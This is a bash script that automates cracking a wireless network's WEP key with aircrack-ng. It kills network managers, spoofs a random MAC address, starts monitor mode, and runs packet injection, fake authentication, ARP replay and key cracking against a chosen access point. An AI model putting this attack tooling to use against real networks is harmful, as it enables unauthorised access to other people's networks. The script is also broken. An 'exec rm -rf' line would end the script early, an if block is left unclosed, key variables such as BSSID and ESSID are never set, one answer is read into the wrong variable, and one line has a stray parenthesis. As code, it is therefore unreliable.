#!/bin/bash

echo -e "\033[1;035m \n"
echo "# Yet Another Aircrack-ng Script 													"			
echo "#                                                                                 " 
echo "# Aircrack-ng wep crack automation script                                         "
echo "# This script assumes you are familiar with you systems wireless interface names  " 
echo "#                             													"
echo "# Run as root																		"
echo "#																					"
echo "# This program is free software: you can redistribute it and/or modify			"
echo "# it under the terms of the GNU General Public License as published by			"
echo "# the Free Software Foundation, either version 3 of the License, or				"
echo "# (at your option) any later version.												"
echo "#																					"
echo "# This program is distributed in the hope that it will be useful,					"	
echo "# but WITHOUT ANY WARRANTY; without even the implied warranty of					"
echo "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the					"
echo "# GNU General Public License for more details.									"		
echo "#																					"		
echo "# You should have received a copy of the GNU General Public License				"
echo "# along with this program.  If not, see <http://www.gnu.org/licenses/>.			"


TERM=xterm

# Make sure root is running
if [ "$(id -u)" != "0" ]; then
    echo "You need to SU root" 1>&2
    exit 1
fi

# Kill potential problem programs
echo "Killing potential adapter conflicts..."
killall NetworkManager
killall NetworkManagerDispatcher
killall wpa_supplicant
killall avahi-daemon
echo "Giving programs time to die..."
sleep 5
clear

# Ask to remove previous .cap and .ivs files
echo "Remove previous .cap and .ivs files? (y/n)"
    read -r answer
    if [[ "$answer" == "y" || "$answer" == "Y" ]] ; then
        exec rm -rf *.cap *.ivs
    else if   [[ "$answer" == "n" || "$answer" == "N" ]] ; then
	echo "Not removing files"
    else
	echo "Invalid response" 
    fi
clear 
 
# Gather some information about your devices and channels
echo "What is the name of your wireless interface?"
read WIRELESS
echo "What channel do you want to monitor?"
read CHANNEL
echo "What is trhe name of your promiscuos interface?" 
read DEVICE
echo "Your interface is: "$WIRELESS
echo "Your channel is: "$CHANNEL
echo "Your device is: "$DEVICE
clear
 
# Go to promiscuous mode with random mac
ifconfig $DEVICE down
ifconfig $WIRELESS down        
MAC=`(date; cat /proc/interrupts) | md5sum | sed -r 's/^(.{10}).*$/\1/; s/([0-9a-f]{2})/\1:/g; s/:$//;'`
ifconfig $WIRELESS hw ether $MAC
ifconfig $WIRELESS up
airmon-ng start $DEVICE $CHANNEL
clear

# Run injection test on desired AP
xterm aireplay-ng -9 -e $ESSID -a $BSSID -i $DEVICE &

# Begin dumping captured IV's to a file
xterm airodump-ng -c $CHANNEL -w $FILE --bssid $BSSID $DEVICE & 

# Conduct fake authentication
xterm aireplay-ng -1 0 -a $BSSID -h $MAC -e $ESSID $DEVICE &

# If access point is picky, reauth every 6000 seconds, keep alive 10s, 1 data set at a time
echo "Is the access point picky?"
read picky
if [[ "$answer" == "y" || "$answer" == "Y" ]] ; then
    xterm aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $MAC &
	else
		echo "Great"
fi
clear

# ARP replay if ARP found
xterm aireplay-ng -3 -b $BSSID -h $MAC &

# Decide if we are cracking PTW style or using Korek method
echo "Which cracking method do you want to use, Pwn The World or korek?"
read 

xterm aircrack-ng -b $BSSID $FILE*.cap) &

xterm aircrack-ng -K -b $BSSID $FILE*.cap &

wait




